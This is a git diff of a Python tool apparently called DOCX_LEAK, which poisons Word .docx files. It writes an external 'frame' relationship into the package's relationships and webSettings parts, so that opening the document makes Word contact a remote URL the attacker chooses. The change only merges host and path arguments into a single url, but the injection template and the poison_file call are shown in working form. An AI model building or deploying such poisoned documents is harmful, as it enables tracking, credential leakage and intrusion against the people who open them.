@@ -6,11 +6,10 @@ from update_zip_file import UpdateableZipFile
 
 class DOCX_LEAK:
     
-    def __init__(self,docx_path,host,url_path):
+    def __init__(self,docx_path,url):
 
         self.docx_path = docx_path 
-        self.host = host 
-        self.url_path = url_path
+        self.url = url
         self.docx_file_read = zipfile.ZipFile(self.docx_path,"r")
 
     def write_word_webSettings_xml(self):
@@ -37,7 +36,7 @@ class DOCX_LEAK:
         )
 
     def insert_word__rels_document_xml_rels(self):
-        return f"<?xml version='1.0' encoding='UTF-8' standalone='yes'?><Relationships xmlns='http://schemas.openxmlformats.org/package/2006/relationships'><Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame' Target='{self.host}/{self.url_path}' TargetMode='External'/></Relationships>"
+        return f"<?xml version='1.0' encoding='UTF-8' standalone='yes'?><Relationships xmlns='http://schemas.openxmlformats.org/package/2006/relationships'><Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame' Target='{self.url}' TargetMode='External'/></Relationships>"
 
    
     def read_word_webSettings_xml(self):
@@ -60,5 +59,5 @@ class DOCX_LEAK:
  
 
 if __name__ == "__main__":
-    dxl = DOCX_LEAK("<docx-filename>","<host>","<path>")
+    dxl = DOCX_LEAK("<docx-filename>","<url>")
     dxl.poision_file()
